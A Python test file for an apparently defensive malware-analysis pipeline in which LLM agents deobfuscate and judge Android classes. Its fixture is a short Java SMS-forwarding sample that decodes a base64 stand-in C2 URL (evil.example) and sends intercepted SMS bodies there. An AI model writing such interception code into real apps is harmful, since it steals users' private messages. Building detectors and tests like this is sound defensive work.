"""End-to-end wiring test for L4/deobfuscate.py's three-agent pipeline.

None of the parallel-built modules (retriever, scorer, network_correlation,
reasoning_trail, verify_verdict) were tested together against the actual
`explain_class` integration point — each agent tested its own file in
isolation per `decisions/plan_l4_agentic_verdicts.md` §6's interface
contract. This test exercises the real wiring: a fake, call-sequenced
Provider stands in for the three LLM calls (analyst, reasoning-trail,
verifier), but the retriever, network_correlation, verify.py and scorer run
for real, against the real (small, seeded) `L4/knowledge/kb.json`.
"""

from __future__ import annotations

import sys
from dataclasses import dataclass, field
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from L4.provider import Completion  # noqa: E402
from L4.deobfuscate import explain_class, package_l0_context, package_l2_context  # noqa: E402


@dataclass
class SequencedFakeProvider:
    """Returns one canned JSON response per call, in order: analyst, then
    reasoning-trail, then verifier — matching explain_class's call order."""

    responses: list[str]
    model: str = "fake/model"
    name: str = "fake"
    calls: list[dict] = field(default_factory=list)
    _i: int = 0

    def complete(self, messages, *, max_tokens: int = 2048, temperature: float = 0.0,
                 json_object: bool = False, reasoning: bool = False) -> Completion:
        self.calls.append({"messages": messages, "json_object": json_object})
        text = self.responses[min(self._i, len(self.responses) - 1)]
        self._i += 1
        return Completion(
            text=text, model=self.model, provider=self.name,
            prompt_tokens=10, completion_tokens=10, reasoning_chars=0,
            cost_usd=0.001, latency_s=0.01,
        )


# A base64 literal that decodes to a real value the analyst can correctly
# report — mirrors T26's worked example (the model must say what the bytes
# actually say, not a plausible-looking neighbour).
_ENCODED = "aHR0cDovL2V2aWwuZXhhbXBsZS9nYXRlLnBocA=="  # http://evil.example/gate.php
_DECODED = "http://evil.example/gate.php"

SOURCE = f'''
public class SmsForwarder {{
    public void onReceive(Context ctx, Intent intent) {{
        SmsManager mgr = SmsManager.getDefault();
        String body = extractBody(intent);
        String c2 = decode("{_ENCODED}");
        mgr.sendTextMessage(c2, null, body, null, null);
    }}
}}
'''

ANALYST_JSON = f'''{{
  "purpose": "forwards intercepted SMS to a remote endpoint",
  "renamed": {{}},
  "decoded_strings": {{"{_ENCODED}": "{_DECODED}"}},
  "api_calls": ["SmsManager.sendTextMessage"],
  "iocs": [],
  "behaviours": ["sms_interception"],
  "first_verdict": "malicious",
  "suspicion": {{"flag": true, "reason": "forwards SMS body off-device"}},
  "matched_pattern": null,
  "confidence": "high"
}}'''

TRAIL_JSON = '''{
  "steps": [
    {"text": "SmsManager.sendTextMessage forwards the intercepted body", "kb_id": null}
  ]
}'''

VERIFIER_JSON = '''{
  "status": "confirmed",
  "counter_argument": "no benign explanation covers forwarding SMS content to a decoded URL",
  "confidence": "high"
}'''


def test_explain_class_end_to_end_scores_and_verifies():
    provider = SequencedFakeProvider(responses=[ANALYST_JSON, TRAIL_JSON, VERIFIER_JSON])

    explanation, completions = explain_class(
        provider, "SmsForwarder.java", SOURCE, extracted_iocs=[],
        l0_context="app claims to be SBI", l2_context="package behaviour: sms_intercepted=true",
        network_evidence={},
    )

    assert len(provider.calls) == 3, "analyst + reasoning-trail + verifier, in order"
    assert provider.calls[0]["json_object"] is True

    # The mechanically-checkable claims actually survived verify.py.
    assert explanation.kept["decoded_strings"] == {_ENCODED: _DECODED}
    assert "SmsManager.sendTextMessage" in explanation.kept["api_calls"]

    # The reasoning trail and verifier ran and are attached.
    assert explanation.trail is not None
    assert explanation.trail.steps
    assert explanation.verifier is not None
    assert explanation.verifier.status == "confirmed"

    # A real, mechanically-verified claim with no KB match and a confirmed
    # verifier lands in the "plausible" band (3-5), not "grounded" (needs a
    # KB match) and not "hunch" (that's for zero kept claims) — see the
    # bands table in decisions/plan_l4_agentic_verdicts.md §3.
    assert explanation.score is not None
    assert explanation.score.band == "plausible"
    assert 3 <= explanation.score.score <= 5


def test_explain_class_survives_a_fabricated_decode():
    """The T26 case, end to end: a claimed decode that doesn't match must be
    dropped by verify.py before it ever reaches the scorer."""
    bad_analyst_json = ANALYST_JSON.replace(_DECODED, "http://totally-different.example/x")
    provider = SequencedFakeProvider(responses=[bad_analyst_json, TRAIL_JSON, VERIFIER_JSON])

    explanation, _ = explain_class(
        provider, "SmsForwarder.java", SOURCE, extracted_iocs=[],
    )

    assert explanation.kept["decoded_strings"] == {}
    assert any(d["kind"] == "decoded_strings" for d in explanation.dropped)


def test_package_context_helpers_degrade_gracefully_on_empty_doc():
    assert package_l0_context({}) == "no L0 context available"
    assert "sms_intercepted=False" in package_l2_context({})
